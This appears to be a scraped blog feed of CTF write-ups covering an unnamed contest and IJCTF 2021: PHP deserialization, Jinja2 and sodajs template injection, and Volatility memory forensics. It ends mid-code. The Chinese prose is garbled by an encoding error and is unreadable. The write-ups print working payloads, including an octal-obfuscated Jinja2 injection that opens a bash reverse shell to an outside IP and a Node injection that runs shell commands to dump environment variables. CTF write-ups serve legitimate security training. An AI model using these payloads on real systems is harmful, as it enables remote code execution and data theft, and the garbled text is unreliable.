        <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h3><p>æŒ‰ç…§æç¤ºè¿›è¡Œè¯·æ±‚å³å¯è·å¾— flagã€‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?a=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>124.71.236.172</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>3</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line">b=2</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;you_are_great!!!&#125;</span><br></pre></td></tr></table></figure><h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><p>é¢˜ç›®ç»™å‡ºçš„ä»£ç å¦‚ä¸‹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XMAN</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">&quot;Hel&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;para = <span class="string">&quot;xctfer&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;check = <span class="keyword">new</span> Filter;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;para) &amp;&amp; <span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;class)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;what?Really?&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hel</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;Hello bro, I guess you are a lazy &quot;</span>.<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Filter</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">vaild</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$pattern</span> = <span class="string">&#x27;/[!|@|#|$|%|^|&amp;|*|=|\&#x27;|&quot;|:|;|?]/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xctf&#x27;</span>]))&#123;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;xctf&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> XMAN;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è§‚å¯Ÿåˆ°æœ‰å¯¹ <code>valid</code> æ–¹æ³•çš„è°ƒç”¨ï¼Œå› æ­¤å°è¯•ä½¿ç”¨ FilesystemIterator ç±»åˆ—å‡ºç›®å½•ä¸‹æ–‡ä»¶ï¼Œå†ä½¿ç”¨ SplFileObject è¯»å–å‡º flagã€‚æ„é€ å‡ºå¦‚ä¸‹ä¸¤æ®µè„šæœ¬ç”Ÿæˆè½½è·ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// List directory</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XMAN</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">&quot;FilesystemIterator&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;para = <span class="string">&quot;./xxxXXXmMManNNn&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> XMAN());</span><br><span class="line"></span><br><span class="line"><span class="comment">// Read flag</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XMAN</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">&quot;SplFileObject&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;para = <span class="string">&quot;./xxxXXXmMManNNn/f1a4.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> XMAN());</span><br></pre></td></tr></table></figure><p>å°†ç”Ÿæˆçš„è½½è·ä½œä¸º GET å‚æ•° <code>xctf</code> æäº¤å³å¯è·å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;928erf51ab894a64f7865cf3c2128b34&#125;</span><br></pre></td></tr></table></figure><h3 id="easyssti"><a href="#easyssti" class="headerlink" title="easyssti"></a>easyssti</h3><blockquote><p><a href="https://www.anquanke.com/post/id/223895#:~:text=Web-,Normal%20ssti,-ban%E4%BA%86%E5%BE%88%E5%A4%9A">https://www.anquanke.com/post/id/223895#:~:text=Web-,Normal%20ssti,-ban%E4%BA%86%E5%BE%88%E5%A4%9A</a></p></blockquote><p>è·Ÿ 2020 å¹´çš„å®‰æ´µæ¯çš„ Normal ssti ç›¸ä¼¼ï¼Œä¹Ÿæ˜¯ Jinja2 çš„æ¨¡æ¿æ³¨å…¥ã€‚ä¸åŒç‚¹åœ¨äºå¾ˆéš¾æ‹¿åˆ° getitem æ–¹æ³•ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨ values æ–¹æ³•å°†å­—å…¸è½¬åŒ–ä¸ºæ•°ç»„å†å–å€¼ã€‚ä½¿ç”¨å…«è¿›åˆ¶ç»•è¿‡ï¼Œæ„é€ å‡ºå¦‚ä¸‹è½½è·è¿›è¡Œåå¼¹ shellã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;&#123;%print((lipsum|attr(&quot;__globals__&quot;)).values()[18].values()[134](&quot;\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\160\157\160\145\156\50\47\142\141\163\150\40\55\143\40\42\142\141\163\150\40\55\151\40\76\46\40\57\144\145\166\57\164\143\160\57\70\56\61\63\66\56\70\56\62\61\60\57\63\62\65\65\40\60\76\46\61\42\47\51\56\162\145\141\144\50\51&quot;))%&#125;</span><br></pre></td></tr></table></figure><p>åœ¨é¶æœºçš„æ ¹ç›®å½•å¯ä»¥æ‰¾åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;zPkb3tzUW8m0KuSfPoPqgSU37I4ui2hZ&#125;</span><br></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="try-all-volatility"><a href="#try-all-volatility" class="headerlink" title="try_all_volatility"></a>try_all_volatility</h3><blockquote><p>æˆ‘ä»å­™å‰å„¿é‚£é‡Œå·æ¥æ•°æ®ï¼Œä½†ä»–æ˜¯ä¸ªæœºçµé¬¼ï¼Œç«Ÿç„¶æŠŠflagè—åˆ°äº†è‡ªæ‹ç…§é‡Œ</p></blockquote><p>å°†æ–‡ä»¶è§£å‹åä½¿ç”¨ Volatility 2 çš„ imageinfo æ£€æµ‹ï¼Œå¯ä»¥å¾—åˆ°å¦‚ä¸‹å¦‚ä¸‹ä¿¡æ¯ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">INFO    : volatility.debug    : Determining profile based on KDBG search...</span><br><span class="line">          Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86)</span><br><span class="line">                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)</span><br><span class="line">                     AS Layer2 : FileAddressSpace (&#x2F;mnt&#x2F;f&#x2F;ghrepos&#x2F;volatility2&#x2F;imgs&#x2F;mem)</span><br><span class="line">                      PAE type : PAE</span><br><span class="line">                           DTB : 0x713000L</span><br><span class="line">                          KDBG : 0x8054e2e0L</span><br><span class="line">          Number of Processors : 2</span><br><span class="line">     Image Type (Service Pack) : 3</span><br><span class="line">                KPCR for CPU 0 : 0xffdff000L</span><br><span class="line">                KPCR for CPU 1 : 0xbab40000L</span><br><span class="line">             KUSER_SHARED_DATA : 0xffdf0000L</span><br><span class="line">           Image date and time : 2021-06-18 02:13:15 UTC+0000</span><br><span class="line">     Image local date and time : 2021-06-18 10:13:15 +0800</span><br></pre></td></tr></table></figure><p>ç¡®å®š profile ä¸º WinXPSP3x86 åå¯ä»¥ä½¿ç”¨ filescan æ‰«æåˆ°æ¡Œé¢æœ‰ä¸¤ä¸ªå…³é”®æ–‡ä»¶ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">0x0000000009aaf028      1      0 R--rwd \Device\HarddiskVolume1\Documents and Settings\Administrator\æ¡Œé¢\MISC\hint.txt</span><br><span class="line">0x000000000a283498      1      0 R--rwd \Device\HarddiskVolume1\Documents and Settings\Administrator\æ¡Œé¢\MISC\res.png</span><br></pre></td></tr></table></figure><p>å°†æ–‡æœ¬æ–‡æ¡£å’Œå›¾ç‰‡æå–å‡ºæ¥ï¼Œåœ¨ hint.txt ä¸­å¯ä»¥å¾—åˆ°å¦‚ä¸‹æç¤ºã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">youcangetsthfromcmd</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ cmdscan åŠŸèƒ½å¯ä»¥å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">**************************************************</span><br><span class="line">CommandProcess: csrss.exe Pid: 600</span><br><span class="line">CommandHistory: 0x2e3a508 Application: cmd.exe Flags: Allocated, Reset</span><br><span class="line">CommandCount: 18 LastAdded: 17 LastDisplayed: 17</span><br><span class="line">FirstCommand: 0 CommandCountMax: 50</span><br><span class="line">ProcessHandle: 0x198</span><br><span class="line">Cmd #0 @ 0x55b548: cd C:\Documents and Settings\Administrator\??\MISC</span><br><span class="line">Cmd #1 @ 0x2dd7a20: winpmem_v3.3.rc3.exe -dd -o memdump.raw --format --volume_format raw</span><br><span class="line">Cmd #2 @ 0x55b8a8: winpmem_v3.3.rc3.exe -dd -o memdump.raw --format raw  --volume_format raw</span><br><span class="line">Cmd #3 @ 0x55b3f0: can you find this?</span><br><span class="line">Cmd #4 @ 0x5524b8: yes</span><br><span class="line">Cmd #5 @ 0x2e39400: please go on</span><br><span class="line">Cmd #6 @ 0x2e39a80: haha</span><br><span class="line">Cmd #7 @ 0x2e01170: flag is down</span><br><span class="line">Cmd #8 @ 0x2e02110: flag&#123;xixixixix_Llalala_leizeNiuBi&#125;</span><br><span class="line">Cmd #9 @ 0x2e02f60: winpmem_v3.3.rc3.exe -dd -o memdump.raw --format raw  --volume_format raw</span><br><span class="line">Cmd #10 @ 0x2e3a130: waw</span><br><span class="line">Cmd #11 @ 0x2e3a1d8: jpg?????????????????????????????????????????????????</span><br><span class="line">Cmd #12 @ 0x2e3dd80: ?</span><br><span class="line">Cmd #13 @ 0x55b878: nonono it is png</span><br><span class="line">Cmd #14 @ 0x55c778: just check the pixel!</span><br><span class="line">Cmd #15 @ 0x55d1d8: !!!!!!!</span><br><span class="line">Cmd #16 @ 0x2e3a028: !!!!!!</span><br><span class="line">Cmd #17 @ 0x2dd7ad0: winpmem_v3.3.rc3.exe -dd -o memorydump.raw --format raw --volume_format raw</span><br><span class="line">**************************************************</span><br><span class="line">CommandProcess: csrss.exe Pid: 600</span><br><span class="line">CommandHistory: 0x2e3ad88 Application: winpmem_v3.3.rc3.exe Flags: Allocated</span><br><span class="line">CommandCount: 0 LastAdded: -1 LastDisplayed: -1</span><br><span class="line">FirstCommand: 0 CommandCountMax: 50</span><br><span class="line">ProcessHandle: 0x624</span><br></pre></td></tr></table></figure><p>å¯¹å›¾ç‰‡ä½¿ç”¨ StegSolve è¿›è¡Œ B é€šé“ä¸‹çš„ MSB æ•°æ®æå–å¯ä»¥å¾—åˆ°ä¸€ä¸ªå‹ç¼©åŒ…ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/f88da837-3d50-4191-b2d6-8c0874735dfa/1628227223003208/fb88be86ff538bf5e307a88e601664e12f84be03.jpg"></p><p>å°†å…¶ä¿å­˜å‡ºæ¥åè§£å‹å¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Waw!_Y0u_D1d!_it_^_^&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>IJCTF 2021</title>
      <link href="/zh-CN/posts/603682ab.html"/>
      <url>/zh-CN/posts/603682ab.html</url>
      
        <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="SodaFactory"><a href="#SodaFactory" class="headerlink" title="SodaFactory"></a>SodaFactory</h3><blockquote><p>Welcome to my SodaFactory.</p><p>Note: You donâ€™t need any bruteforce</p><p>Author: TheGrandPew#0740</p></blockquote><p>ä½¿ç”¨çš„åº“æ˜¯ sodajsï¼Œä»ä»¥ä¸‹ä»£ç çœ‹å‡ºå‚æ•° name æœªç»å¤„ç†å°±ä¼ å…¥äº†ï¼Œåœ¨æ¸²æŸ“åè¾“å‡ºã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">app.post(<span class="string">&#x27;/makeSoda&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> &#123;name, brand&#125; = req.body;</span><br><span class="line">  img = images[brand];</span><br><span class="line">  res.send(soda(<span class="string">`</span></span><br><span class="line"><span class="string">    &lt;title&gt;<span class="subst">$&#123;name&#125;</span>&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;img src=&#x27;<span class="subst">$&#123;img&#125;</span>&#x27; alt=&#x27;<span class="subst">$&#123;name&#125;</span>&#x27;&gt;</span></span><br><span class="line"><span class="string">  `</span>,&#123;&#125;))</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>å› æ­¤å¯¹å‚æ•° name å°è¯• SSTIï¼Œæ„é€  <code>&#123;&#123;1 + 1&#125;&#125;</code> å¯ä»¥å‘ç°è¾“å‡ºçš„æ˜¯ 2ï¼Œå› æ­¤åˆ¤å®šå­˜åœ¨æ¨¡æ¿æ³¨å…¥ã€‚ä½¿ç”¨å¦‚ä¸‹è½½è·ä¸€æŠŠæ¢­è¯»å‡ºç¯å¢ƒå˜é‡æ‰¾åˆ° flagã€‚</p><blockquote><p><a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection</a></p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; <span class="string">&quot; &quot;</span>.toString.constructor(<span class="string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;env&#x27;).toString()&quot;</span>)() &#125;&#125;</span><br></pre></td></tr></table></figure><p>è¯»å‡ºå¦‚ä¸‹ç¯å¢ƒå˜é‡ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">NODE_VERSION&#x3D;12.18.1</span><br><span class="line">HOSTNAME&#x3D;53d556edba99</span><br><span class="line">YARN_VERSION&#x3D;1.22.4</span><br><span class="line">PORT&#x3D;3000</span><br><span class="line">HOME&#x3D;&#x2F;root</span><br><span class="line">PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin</span><br><span class="line">PWD&#x3D;&#x2F;app</span><br><span class="line">FLAG&#x3D;IJCTF&#123;Y00_maK3_g00D_50DA_MA73&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IJCTF&#123;Y00_maK3_g00D_50DA_MA73&#125;</span><br></pre></td></tr></table></figure><h3 id="Memory"><a href="#Memory" class="headerlink" title="Memory"></a>Memory</h3><blockquote><p>Do you remember the past? You lived hard. Now, you need to take some rest by remembering your past.</p><p>Run <code>/flag</code></p><p>Note: You donâ€™t need any bruteforce. The provided <code>phpinfo</code> has all the information for solving this challenge. So, Iâ€™ll not provide Dockerfile of this challenge.</p><p>Author:<code>sqrtrev#9113</code></p></blockquote><p>é¢˜ç›®çš„é™„ä»¶ä¸­ç»™å‡ºäº†å¦‚ä¸‹ä¸¤ç«¯ä»£ç å’Œä¸€ä¸ª PHPINFO æ–‡ä»¶ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;filter.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$r</span> = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$errorno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;error_log(<span class="string">&quot;[<span class="subst">$errorno</span>] <span class="subst">$errstr</span>&quot;</span>, <span class="number">0</span>);&#125;;</span><br><span class="line">set_error_handler(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="keyword">use</span>(<span class="params">&amp;<span class="variable">$r</span></span>)</span>&#123; <span class="variable">$r</span> = <span class="literal">True</span>; &#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Welcome!!&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>] == <span class="string">&quot;chance&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$_GET</span>[<span class="string">&#x27;chance&#x27;</span>]) &gt; <span class="number">15</span> | filter(<span class="variable">$_GET</span>[<span class="string">&#x27;chance&#x27;</span>],<span class="number">1</span>) | checkLetterNums(<span class="variable">$_GET</span>[<span class="string">&#x27;chance&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack T.T&quot;</span>);</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;chance&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;bonus&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$_GET</span>[<span class="string">&#x27;bonus&#x27;</span>]) &gt; <span class="number">32</span> | filter(<span class="variable">$_GET</span>[<span class="string">&#x27;bonus&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;No bonus ~.~&quot;</span>);</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;bonus&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//filter.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$var</span>, <span class="variable">$case</span> = <span class="number">0</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">    <span class="variable">$banned</span> = [<span class="string">&quot;\$_&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;include&quot;</span>, <span class="string">&quot;require&quot;</span>, <span class="string">&quot;?&quot;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;*&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$banned</span> <span class="keyword">as</span> <span class="variable">$ban</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strstr(<span class="variable">$var</span>, <span class="variable">$ban</span>)) <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$case</span>)&#123;</span><br><span class="line">        <span class="variable">$additional</span> = [<span class="string">&quot;php&quot;</span>,<span class="string">&quot;/&quot;</span>];</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$additional</span> <span class="keyword">as</span> <span class="variable">$ban</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(strstr(<span class="variable">$var</span>, <span class="variable">$ban</span>)) <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> 